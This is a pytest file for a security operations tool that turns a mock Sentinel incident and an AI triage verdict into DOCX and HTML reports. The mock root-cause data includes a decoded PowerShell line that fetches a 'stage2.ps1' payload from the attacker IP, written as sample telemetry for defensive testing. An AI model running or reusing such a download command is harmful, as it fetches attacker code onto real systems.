import pytest
import io
import docx
from app.services.report_generator import generate_docx_report, generate_html_report

MOCK_INCIDENT = {
    "id": "inc-test-101",
    "incidentNumber": 101,
    "title": "Anomalous Login Detected from Tor Exit Node",
    "severity": "High",
    "createdTimeUtc": "2026-09-14T12:00:00Z",
    "description": "Suspicious login attempt from known malicious IP 185.220.101.5."
}

MOCK_REPORT = {
    "verdict": "TRUE_POSITIVE",
    "confidence_score": 95,
    "severity_assessment": "High",
    "model_used": "gpt-6-astra",
    "reasoning_tier": "deep_reasoning",
    "executive_summary": "Confirmed unauthorized access from Tor exit node targeting finance admin.",
    "mitre_attack": {
        "tactics": ["Initial Access", "Defense Evasion"],
        "techniques": ["T1078 Valid Accounts", "T1090 Proxy"]
    },
    "evidence_findings": [
        "Origin IP 185.220.101.5 has 100% Abuse Confidence Score on AbuseIPDB.",
        "Sign-in location: Amsterdam, NL (No prior historical logins for this user)."
    ],
    "recommended_actions": [
        "Revoke all active Entra ID tokens for compromised account.",
        "Enforce Conditional Access policy requiring managed device."
    ],
    "root_cause_analysis": {
        "patient_zero": "finance-admin@contoso.com",
        "initial_access_vector": "Stolen session cookie via adversary-in-the-middle phishing.",
        "process_tree": [
            {
                "pid": "4812",
                "process": "powershell.exe",
                "command": "powershell.exe -enc SQBYAE0A...",
                "decoded": "Invoke-WebRequest -Uri http://185.220.101.5/stage2.ps1"
            }
        ],
        "network_c2_telemetry": {
            "destination_ip": "185.220.101.5",
            "port": 443,
            "protocol": "HTTPS",
            "reputation": "Tor Exit Node",
            "bytes_transferred": "4.2 MB"
        }
    },
    "kql_queries_used": [
        "SigninLogs | where IPAddress == '185.220.101.5'"
    ]
}

def test_generate_docx_report():
    docx_stream = generate_docx_report(MOCK_INCIDENT, MOCK_REPORT, analyst_name="Test Analyst")
    assert isinstance(docx_stream, io.BytesIO)
    assert docx_stream.getbuffer().nbytes > 0

    # Parse back using python-docx
    doc = docx.Document(docx_stream)
    all_text = " ".join([p.text for p in doc.paragraphs] + [cell.text for tbl in doc.tables for row in tbl.rows for cell in row.cells])
    assert "MICROSOFT SENTINEL SOC" in all_text
    assert "Confirmed unauthorized access" in all_text
    assert "Test Analyst" in all_text
    assert "gpt-6-astra" in all_text
    assert "Deep Reasoning" in all_text

def test_generate_html_report():
    html_output = generate_html_report(MOCK_INCIDENT, MOCK_REPORT, analyst_name="Test Analyst")
    assert isinstance(html_output, str)
    assert "MICROSOFT SENTINEL" in html_output
    assert "#101" in html_output
    assert "185.220.101.5" in html_output
    assert "Test Analyst" in html_output
    assert "gpt-6-astra" in html_output
